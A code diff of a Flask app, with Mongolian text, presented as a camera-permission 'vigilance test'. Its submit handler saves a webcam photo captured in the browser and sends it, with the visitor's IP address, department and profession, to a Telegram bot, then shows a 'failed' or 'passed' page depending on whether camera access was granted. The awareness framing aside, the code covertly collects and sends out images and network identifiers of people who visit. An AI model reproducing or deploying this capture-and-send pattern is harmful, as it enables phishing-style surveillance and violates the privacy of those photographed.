@@ -38,14 +38,16 @@ def send_telegram_media_notification(message_text, image_filepath=None):
 def index():
     return render_template('index.html')
 
+@app.route('/success')
+def success():
+    return "<h1>Амжилттай илгээгдлээ.</h1>"
+
 @app.route('/submit', methods=['POST'])
 def submit():
     role = request.form.get('role_department', 'Unknown')
     prof = request.form.get('profession', 'Unknown')
     photo_data = request.form.get('photo_data', '')
-    
-    # JavaScript-ээс ирэх камерын статус
-    camera_allowed = request.form.get('camera_allowed', 'false')
+    camera_allowed = request.form.get('camera_allowed', 'false') # JS-ээс ирэх утга
     
     image_path = None
     if photo_data and ',' in photo_data:
@@ -56,24 +58,37 @@ def submit():
             image_path = os.path.join(UPLOAD_FOLDER, filename)
             with open(image_path, 'wb') as f:
                 f.write(decoded)
-        except:
-            image_path = None
+        except Exception as e:
+            print(f"Image saving error: {e}")
 
     msg = f"📋 ТЕСТНИЙ ХАРИУ:\n👤 Хэлтэс: {role}\n💼 Мэргэжил: {prof}\n📸 Камер зөвшөөрсөн: {camera_allowed}\n📍 IP: {request.remote_addr}"
     send_telegram_media_notification(msg, image_path)
 
-    # Камер зөвшөөрсөн эсэхээс хамаарч өөр хуудас руу шилжүүлэх
+    # Камер зөвшөөрсөн эсэхээс хамаарч redirect хийх
     if camera_allowed == 'true':
-        return redirect(url_for('fail_page')) # Зөвшөөрсөн (Уналаа)
+        return redirect(url_for('fail_page'))
     else:
-        return redirect(url_for('pass_page')) # Зөвшөөрөөгүй (Тэнцлээ)
+        return redirect(url_for('pass_page'))
 
 @app.route('/fail')
 def fail_page():
-    return "<h1>⚠️ ТА СОНОР СЭРЭМЖИЙН ТЕСТЭД УНАЛАА!</h1><p>Та танихгүй сайтад камерын зөвшөөрөл өгсөн байна.</p>"
+    return """
+    <body style="text-align:center; padding-top:100px; font-family:sans-serif; background-color:#fff4f4;">
+        <h1 style="color:#d9534f;">⚠️ ТА СОНОР СЭРЭМЖИЙН ТЕСТЭД УНАЛАА!</h1>
+        <p>Та танихгүй сайтад камерын зөвшөөрөл өгсөн байна. Энэ нь аюултай.</p>
+        <a href="/">Буцах</a>
+    </body>
+    """
 
 @app.route('/pass')
 def pass_page():
-    return "<h1>✅ БАЯР ХҮРГЭЕ!</h1><p>Та сонор сэрэмжтэй байж, камерын зөвшөөрөл өгсөнгүй. Гэхдээ танихгүй линкээр орохгүй байхыг зөвлөж байна.</p>"
+    return """
+    <body style="text-align:center; padding-top:100px; font-family:sans-serif; background-color:#f4fff4;">
+        <h1 style="color:#28a745;">✅ БАЯР ХҮРГЭЕ!</h1>
+        <p>Та сонор сэрэмжтэй байж, камерын зөвшөөрөл өгсөнгүй. Энэ нь зөв үйлдэл.</p>
+        <a href="/">Буцах</a>
+    </body>
+    """
+
 if __name__ == '__main__':
     app.run(port=8080)
